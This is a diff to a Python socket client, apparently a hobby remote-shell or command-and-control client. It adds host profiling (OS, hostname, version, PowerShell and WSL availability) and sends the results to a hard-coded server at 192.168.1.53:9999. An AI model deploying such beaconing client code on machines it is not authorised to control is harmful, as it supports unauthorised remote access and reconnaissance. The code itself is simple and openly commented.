@@ -11,13 +11,98 @@ import socket  # for networking (creating client socket)
 import os   # for executing system commands
 import subprocess  # for executing system commands
 import sys  # for system exit
+import platform
+import time
 
 #server configuration. Set localhost to connect to the server running on the same machine.
 SERVER_IP = "192.168.1.53"
 SERVER_PORT = 9999  # Port to connect to the server
 
+# System Info class
+# -----------------------------------------------------------------
+# This class gathers and stores system information such as OS, machine type, hostname, release, and version.
+# It also checks if PowerShell and WSL are available on Windows systems.
+# -----------------------------------------------------------------
+class SystemInfo:
+    def __init__(self, os_info, machine_info, node_name, release, version):
+        self.os_info = os_info  # Operating system (e.g., Windows, Linux, Darwin)
+        self.machine_info = machine_info  # Machine type (e.g., x86_64, ARM)
+        self.node_name = node_name  # Hostname of the machine
+        self.release = release  # OS release version
+        self.version = version  # OS version
+        
+        self.iswindows = (os_info == "windows")  # Check if the OS is Windows
+        self.powershell_available = False  # Flag to check if PowerShell is available
+        self.wsl_available = False
+            
+    def __str__(self):
+        if self.iswindows:
+            return (
+                f"System Info\n"
+                f"  OS: {self.os_info}\n"
+                f"  Machine: {self.machine_info}\n"
+                f"  Hostname: {self.node_name}\n"
+                f"  Release: {self.release}\n"
+                f"  Version: {self.version}\n"
+                f"  PowerShell Available: {self.powershell_available}\n"
+                f"  WSL Available: {self.wsl_available}"
+            )
+        return (
+            f"System Info\n"
+            f"  OS: {self.os_info}\n"
+            f"  Machine: {self.machine_info}\n"
+            f"  Hostname: {self.node_name}\n"
+            f"  Release: {self.release}\n"
+            f"  Version: {self.version}"
+        )
+
+        
+
+
+
+# Function to gather system information
+# -----------------------------------------------------------------
+def get_system_info():
+    print ("Gathering system information...")
+    
+    # Gather system information 
+    systemInfo = SystemInfo(
+        os_info=platform.system().lower(),  # Operating system (e.g., Windows, Linux, Darwin)
+        machine_info=platform.machine(),  # Machine type (e.g., x86_64, ARM)
+        node_name=platform.node(),  # Hostname of the machine
+        release=platform.release(),  # OS release version
+        version=platform.version()  # OS version
+    )
+
+    # check if the OS is Windows
+    if systemInfo.os_info == "windows":
+        # Check if PowerShell is available
+        try:
+            # Check if PowerShell is available
+            subprocess.run(["powershell", "-Command", "echo 'PowerShell is available'"], check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+            print("PowerShell is available.")
+            systemInfo.powershell_available = True  # Set the flag to True if PowerShell is available
+        except subprocess.CalledProcessError:
+            print("PowerShell is not available.")
+        # check if wsl is available
+        try:
+            # Check if WSL is available
+            subprocess.run(["wsl", "--list"], check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+            print("WSL is available.")
+            systemInfo.wsl_available = True  # Set the flag to True if WSL is available
+        except subprocess.CalledProcessError:
+            print("WSL is not available.")
+
+    # Print system information
+    print(f"System Information:\n{systemInfo}")
+    return systemInfo  # Return the system information object
+
+
 
 def main():
+
+    systemInfo = get_system_info()  # Get system information
+    
     # Create a socket using IPv4 (AF_INET) and TCP (SOCK_STREAM)
     client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     print("Start client...")
@@ -25,6 +110,15 @@ def main():
         # Connect to the server
         client_socket.connect((SERVER_IP, SERVER_PORT))
         print(f"Connected to server at {SERVER_IP}:{SERVER_PORT}")
+
+        print("Sending system information...")
+
+        # Create a message with system details
+        system_details = f"System Information:\n{systemInfo}"  # Format the system information as a string
+        # Send system details to the server
+        client_socket.send(system_details.encode())
+
+
     except Exception as e:
         print(f"Connection Failed: {e}")
         sys.exit(1) # Exit if connection fails
